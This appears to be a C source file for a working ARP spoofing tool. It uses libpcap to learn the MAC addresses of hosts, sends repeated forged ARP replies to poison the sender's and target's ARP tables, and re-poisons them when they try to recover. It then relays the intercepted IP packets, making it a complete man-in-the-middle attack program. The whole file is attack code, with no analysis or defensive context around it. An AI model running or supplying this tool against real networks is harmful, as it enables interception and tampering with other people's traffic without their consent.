#include "main.h"

int get_attacker_ip(char* dev, uint8_t* attacker_ip){
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    char buf[20];
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if(ioctl(s, SIOCGIFADDR, &ifr) < 0){
        return FAIL;
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, buf, sizeof(struct sockaddr));
    Ip(attacker_ip, buf);
    close(s);
    return SUCCESS;
}

int get_attacker_mac(char* dev, uint8_t *attacker_mac){
    int mib[6];
    size_t len;
    char *buf;
    unsigned char *ptr;
    struct if_msghdr *ifm;
    struct sockaddr_dl *sdl;

    mib[0] = CTL_NET;
    mib[1] = AF_ROUTE;
    mib[2] = 0;
    mib[3] = AF_LINK;
    mib[4] = NET_RT_IFLIST;
    mib[5] = if_nametoindex(dev);
    sysctl(mib, 6, NULL, &len, NULL, 0);
    
    if ((buf = (char*)malloc(len)) == NULL) {
        return FAIL;
    }

    if (sysctl(mib, 6, buf, &len, NULL, 0) < 0) {
        return FAIL;
    }

    ifm = (struct if_msghdr *)buf;
    sdl = (struct sockaddr_dl *)(ifm + 1);
    ptr = (unsigned char *)LLADDR(sdl);

    memcpy(attacker_mac, ptr, MAC_SIZE);
    return SUCCESS;
}

void usage(void){
    puts("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
    puts("sample : arp-spoof en0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}

pcap_t *handle = NULL;
uint8_t broadcast_mac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
uint8_t unknown_mac[6] = { 0 };

void send_arp_packet(uint8_t *ether_smac, uint8_t *ether_dmac, uint8_t *arp_sip, uint8_t *arp_smac, uint8_t *arp_tip, uint8_t *arp_tmac, uint8_t op){
    ARP_PK packet;
    memcpy(packet.eth.ether_dhost, ether_dmac, MAC_SIZE);
    memcpy(packet.eth.ether_shost, ether_smac, MAC_SIZE);

    packet.eth.ether_type = htons(ETHERTYPE_ARP);
    packet.arp.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp.ar_pro = htons(PROTO_IPv4);
    packet.arp.ar_hln = MAC_SIZE;
    packet.arp.ar_pln = IP_SIZE;
    packet.arp.ar_op = htons(op);

    memcpy(packet.arp_.sip_addr, arp_sip, IP_SIZE);
    memcpy(packet.arp_.smac_addr, arp_smac, MAC_SIZE);
    memcpy(packet.arp_.tip_addr, arp_tip, IP_SIZE);
    memcpy(packet.arp_.tmac_addr, arp_tmac, MAC_SIZE);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(ARP_PK));
    
    if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

int get_mac_addr(uint8_t* attacker_ip, uint8_t* attacker_mac, uint8_t* sender_ip, uint8_t* sender_mac){
    pid_t pid;
    pid = fork();
    if(pid < 0){
        return FAIL;
    }
    else if(pid == 0){
        while(true){
            // send arp packet per 1 second.
            send_arp_packet(attacker_mac, broadcast_mac, attacker_ip, attacker_mac, sender_ip, unknown_mac, ARPOP_REQUEST);
            sleep(1);
        }
    }
    else{
        while(true){
            // capture the reply packet.
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if(res == 0){
                continue;
            };
            if(res == -1 || res == -2){
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                return FAIL;
            }
            if(header->caplen < sizeof(ARP_PK))
                continue;

            ARP_PK rep_packet;
            memcpy(&rep_packet, packet, (size_t)sizeof(ARP_PK));
            if(ip_eq(rep_packet.arp_.sip_addr, sender_ip)
            && ip_eq(rep_packet.arp_.tip_addr, attacker_ip)
            && mac_eq(rep_packet.arp_.tmac_addr, attacker_mac)){
                memcpy(sender_mac, rep_packet.arp_.smac_addr, MAC_SIZE);
                kill(pid, SIGKILL);
                return SUCCESS;
            }
        }
    }
}   

void arp_spoof(int idx, uint8_t *attacker_ip, uint8_t *attacker_mac, uint8_t *sender_ip, uint8_t *sender_mac, uint8_t *target_ip, uint8_t *target_mac){
    pid_t pid;
    pid = fork();
    if(pid < 0){
        fprintf(stderr, "fork() error\n");
        return;
    }
    else if(pid == 0){
        while(true){
            // 1. infect the packet per 3 seconds.
            printf("Infect the ARP Table\n");
            send_arp_packet(attacker_mac, sender_mac, target_ip, attacker_mac, sender_ip, sender_mac, ARPOP_REPLY);
            sleep(5);
        }
    }
    else{
        while(true){
            // 2. relay the ip packet & prevent infection from ARP recover.
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if(res == 0) continue;
            if(res == -1 || res == -2){
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));  
                return;   
            }
            if(header->caplen < LIBNET_ETH_H || header->caplen > 1500){
                continue;
            }

            // if sender wants target's mac, gave him attacker's mac again.
            ARP_PK relay_arp;
            memcpy(&relay_arp, packet, size_t(sizeof(ARP_PK)));
            if(relay_arp.eth.ether_type == htons(ETHERTYPE_ARP)){
                if(ip_eq(relay_arp.arp_.sip_addr, sender_ip)
                && ip_eq(relay_arp.arp_.tip_addr, target_ip)
                && ip_eq(relay_arp.arp_.smac_addr, sender_mac)
                && relay_arp.arp.ar_op == htons(ARPOP_REQUEST)){
                    printf("[%d] Prevent Infection from ARP Recover\n", idx);
                    send_arp_packet(attacker_mac, sender_mac, target_ip, attacker_mac, sender_ip, sender_mac, ARPOP_REPLY);
                    send_arp_packet(attacker_mac, sender_mac, target_ip, attacker_mac, sender_ip, unknown_mac, ARPOP_REQUEST);
                    continue;
                }
            }

            // relay the packet.
            struct libnet_ethernet_hdr eth;
            memcpy(&eth, packet, LIBNET_ETH_H);
            if(eth.ether_type == htons(ETHERTYPE_IP)){
                if(mac_eq(eth.ether_shost, sender_mac) && mac_eq(eth.ether_dhost, attacker_mac)){
                    uint8_t test[4] = { 0 };
                    memcpy(test, &packet[26], IP_SIZE);
                    if(ip_eq(test, sender_ip)){
                        printf("[%d] Relay Packet: %d bytes\n", idx, header->caplen);
                        u_char *new_packet = (u_char*)calloc(header->caplen+1, sizeof(u_char));
                        memcpy(new_packet, packet, header->caplen);
                        memcpy(new_packet, target_mac, MAC_SIZE);
                        memcpy(new_packet+6, attacker_mac, MAC_SIZE);
                        int res = pcap_sendpacket(handle, (const u_char*)new_packet, header->caplen);
                        if (res != 0) {
                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                        }
                        free(new_packet);
                    }
                }
            }
        }
    }
}

int main(int argc, char* argv[]){
    if(argc < 4 || argc % 2 != 0){
        usage();
        return FAIL;
    }

    char* dev = argv[1];
    char err_buf[PCAP_ERRBUF_SIZE] = { 0 };
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, err_buf);
    if(handle == nullptr){
        fprintf(stderr, "couldn't open device(%s)(%s)\n", dev, err_buf);
        return FAIL;
    }

    uint8_t attacker_ip[4] = { 0 };
    if(get_attacker_ip(dev, attacker_ip) != SUCCESS){
        fprintf(stderr, "couldn't get attacker ip adddress\n");
        return FAIL;
    }
    printf("[+] attacker ip addr: %d.%d.%d.%d\n", attacker_ip[0], attacker_ip[1], attacker_ip[2], attacker_ip[3]);
    uint8_t attacker_mac[6] = { 0 };
    if(get_attacker_mac(dev, attacker_mac) != SUCCESS){
        fprintf(stderr, "couldn't get attacker mac address\n");
        return FAIL;
    }
    
    printf("[+] attacker mac addr: %02x:%02x:%02x:%02x:%02x:%02x\n", attacker_mac[0],attacker_mac[1],attacker_mac[2],attacker_mac[3],attacker_mac[4],attacker_mac[5]);

    for(int i=1;i<argc/2;i++){
        pid_t pid;
        pid = fork();
        if (pid < 0){
            printf("error\n");
        }
        else if(pid == 0){
            uint8_t sender_ip[4] = { 0 };
            Ip(sender_ip, argv[2*i]);
            printf("[%d] sender ip addr: %d.%d.%d.%d\n", i, sender_ip[0], sender_ip[1], sender_ip[2], sender_ip[3]);

            uint8_t sender_mac[6] = { 0 };
            if(get_mac_addr(attacker_ip, attacker_mac, sender_ip, sender_mac) != SUCCESS){
                fprintf(stderr, "couldn't get sender mac address\n");
                return FAIL;
            }
            printf("[%d] sender mac addr: %02x:%02x:%02x:%02x:%02x:%02x\n", i, sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);

            uint8_t target_ip[4] = { 0 };
            Ip(target_ip, argv[2*i+1]);
            printf("[%d] target ip addr: %d.%d.%d.%d\n", i, target_ip[0], target_ip[1], target_ip[2], target_ip[3]);

            uint8_t target_mac[6] = { 0 };
            if(get_mac_addr(attacker_ip, attacker_mac, target_ip, target_mac) != SUCCESS){
                fprintf(stderr, "couldn't get target mac address\n");
            }
            printf("[%d] target mac addr: %02x:%02x:%02x:%02x:%02x:%02x\n", i, target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);

            arp_spoof(i, attacker_ip, attacker_mac, sender_ip, sender_mac, target_ip, target_mac);
        }
        else{
            continue;
        }
    }
    pcap_close(handle);
    
}